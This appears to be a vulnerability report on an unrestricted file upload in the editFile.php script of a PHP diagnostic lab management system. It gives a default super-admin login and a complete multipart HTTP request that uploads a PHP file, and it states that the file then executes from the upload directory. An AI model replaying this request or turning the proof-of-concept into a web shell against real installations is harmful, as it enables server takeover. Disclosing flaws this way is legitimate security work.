# Online Diagnostic Lab Management System v1.0 by mayuri_k has arbitrary code execution (RCE)

BUG_Author: Via

vendors: https://www.sourcecodester.com/php/15667/online-diagnostic-lab-management-system-using-php-and-mysql-free-download.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

Vulnerability url: ip/diagnostic/php_action/editFile.php?id=1

Loophole location: Online Diagnostic Lab Management System's editFile.php file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /diagnostic/php_action/editFile.php?id=1 HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.88/diagnostic/editorder.php?id=1
Cookie: PHPSESSID=flklolh755oivesj89eu5fo2c7
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------269801976022857
Content-Length: 431

-----------------------------269801976022857
Content-Disposition: form-data; name="old_image"

Z614.pdf
-----------------------------269801976022857
Content-Disposition: form-data; name="productImage"; filename="se.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------269801976022857
Content-Disposition: form-data; name="btn"


-----------------------------269801976022857--

```

The files will be uploaded to this directory \diagnostic\assets\myimages\

![image](https://user-images.githubusercontent.com/54017627/191397805-e9a3d96e-76e8-4bb6-9a32-9080a6dc58e5.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/191398959-6f0392a7-d90a-4809-8c6b-785aa278cea5.png)
